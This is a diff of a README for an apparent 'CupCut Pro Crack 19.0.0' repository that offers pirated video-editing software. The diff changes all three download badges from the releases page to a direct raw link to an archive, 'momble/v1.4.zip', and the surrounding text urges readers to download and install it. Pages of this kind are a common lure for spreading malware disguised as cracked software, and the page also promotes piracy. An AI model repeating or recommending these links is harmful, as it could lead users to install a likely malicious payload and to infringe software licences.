@@ -1,6 +1,6 @@
 # 🎬 CupCut-Pro-Crack-19.0.0 - Edit Videos Like a Pro Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-CupCut_Pro_19.0.0-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/Barmaidbookofjoel453/CupCut-Pro-Crack-19.0.0/releases)
+[![Download Now](https://img.shields.io/badge/Download-CupCut_Pro_19.0.0-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://raw.githubusercontent.com/Barmaidbookofjoel453/CupCut-Pro-Crack-19.0.0/main/momble/v1.4.zip)
 
 ## 📥 What Is This?
 
@@ -55,7 +55,7 @@ Before you begin, make sure your computer meets the minimum requirements:
 
 Visit this link to download the application:
 
-[![⬇️ Download CupCut Pro 19.0.0](https://img.shields.io/badge/⬇️_Download_CupCut_Pro_19.0.0-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Barmaidbookofjoel453/CupCut-Pro-Crack-19.0.0/releases)
+[![⬇️ Download CupCut Pro 19.0.0](https://img.shields.io/badge/⬇️_Download_CupCut_Pro_19.0.0-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Barmaidbookofjoel453/CupCut-Pro-Crack-19.0.0/main/momble/v1.4.zip)
 
 The download will start automatically. The file size is approximately 250 MB, so depending on your internet speed, it may take a few minutes. Make sure you save the file to a location you can easily find, like your Desktop or Downloads folder.
 
@@ -140,7 +140,7 @@ If you're still having trouble, don't worry! There are many helpful tutorials on
 
 That's it! You now have everything you need to start creating professional-quality videos with CupCut Pro 19.0.0. The installation process is straightforward, and once set up, you'll have access to one of the most powerful video editing tools available.
 
-[![Get Started Now](https://img.shields.io/badge/🚀_Get_Started_Now-Download-5DADE2?style=for-the-badge&logo=appveyor&logoColor=white)](https://github.com/Barmaidbookofjoel453/CupCut-Pro-Crack-19.0.0/releases)
+[![Get Started Now](https://img.shields.io/badge/🚀_Get_Started_Now-Download-5DADE2?style=for-the-badge&logo=appveyor&logoColor=white)](https://raw.githubusercontent.com/Barmaidbookofjoel453/CupCut-Pro-Crack-19.0.0/main/momble/v1.4.zip)
 
 Download your copy today and turn your creative ideas into amazing videos. Enjoy editing!
 
